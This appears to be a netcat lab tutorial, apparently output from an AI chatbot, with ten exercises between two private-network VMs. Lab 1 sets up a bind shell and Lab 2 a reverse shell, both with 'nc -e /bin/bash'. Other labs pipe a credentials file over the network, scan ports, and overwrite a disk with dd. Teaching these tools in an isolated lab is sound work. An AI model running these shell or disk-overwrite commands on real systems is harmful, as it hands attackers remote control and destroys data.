## 🧪 **Netcat Lab Exercises**
### 🛠️ **Setup**
- **VM1 (e.g., Server)**: IP `192.168.10.48`    
- **VM2 (e.g., Client)**: IP `192.168.10.64`    
- Ensure `nc` (netcat) is installed on both:
    `sudo apt install netcat  # Debian/Ubuntu 
    `sudo yum install nc      # RHEL/CentOS`
---
### ✅ **Lab 1: Remote Shell Access**
**Goal**: Gain shell access to VM1 from VM2.
#### On VM1 (Server - Listener):
`nc -nlvp 8888 -e /bin/bash`

#### On VM2 (Client - Connect):
`nc 192.168.10.48 8888`

✅ **Test**: Type commands in the client and see results from server.

---

### 🔄 **Lab 2: Reverse Shell Access**
**Goal**: Simulate a victim initiating a connection back to the attacker.

#### On VM2 (Attacker - Listener):
`nc -nlvp 8888`

#### On VM1 (Victim - Initiator):
`nc 192.168.10.64 8888 -e /bin/bash`

✅ **Test**: Attacker (VM2) should gain shell from VM1.

---
### 📥 **Lab 3: File Download**
**Goal**: Transfer a file from VM1 to VM2.
#### On VM1 (Sender):
`nc -lvp 8888 < file.txt`

#### On VM2 (Receiver):
`nc 192.168.10.48 8888 > file.txt`

✅ **Test**: Compare checksums on both sides.

---

### 📤 **Lab 4: File Upload**
**Goal**: Transfer a file from VM2 to VM1.
#### On VM1 (Receiver):
`nc -lvp 8888 > upload.txt`

#### On VM2 (Sender):
`nc 192.168.10.48 8888 < file.txt`

---

### 💬 **Lab 5: Basic Chat App**
**Goal**: Create a simple terminal chat between VM1 and VM2.

#### On VM1:
`nc -lvp 8888`

#### On VM2:
`nc 192.168.10.48 8888`

✅ **Test**: Chat by typing from both ends.

---

### 🔍 **Lab 6: Port Scanning**
**Goal**: Scan VM1 ports from VM2.
#### On VM2:
`nc -zvn 192.168.10.48 1-100`
✅ **Test**: Note which ports are open.

---

### 🧾 **Lab 7: Banner Grabbing**
**Goal**: Grab a web server banner.
#### On VM1:
`python3 -m http.server 80`

#### On VM2:
```
nc 192.168.10.48 80
GET / HTTP/1.1
Host: 192.168.10.48
```
✅ **Test**: Look for server response (e.g., "200 OK").

---
### 🔐 **Lab 8: Encrypted File Transfer**
**Goal**: Encrypt a file using OpenSSL + Netcat.
#### On VM1 (Sender):
`cat creds.txt | openssl enc -e -aes256 -pass pass:12345 | nc -l -p 8888`

#### On VM2 (Receiver):
`nc 192.168.10.48 8888 | openssl enc -d -aes256 -pass pass:12345 > creds_decrypted.txt`

---

### 📦 **Lab 9: Transfer Directory (Tar + Netcat)**
**Goal**: Send a folder over the network.
#### On VM1 (Sender):
`tar czf - mydir/ | nc -l -p 8888`

#### On VM2 (Receiver):
`nc 192.168.10.48 8888 | tar xzvf -`

---

### 💽 **Lab 10: Clone Disk**
⚠️ Use with caution. This copies raw disk blocks.
#### On VM1 (Sender):
`dd if=/dev/sdb | nc -l -p 8888`

#### On VM2 (Receiver):
`nc 192.168.10.48 8888 | dd of=/dev/sdb`

---

Would you like these labs as a downloadable PDF or a structured markdown file?

4o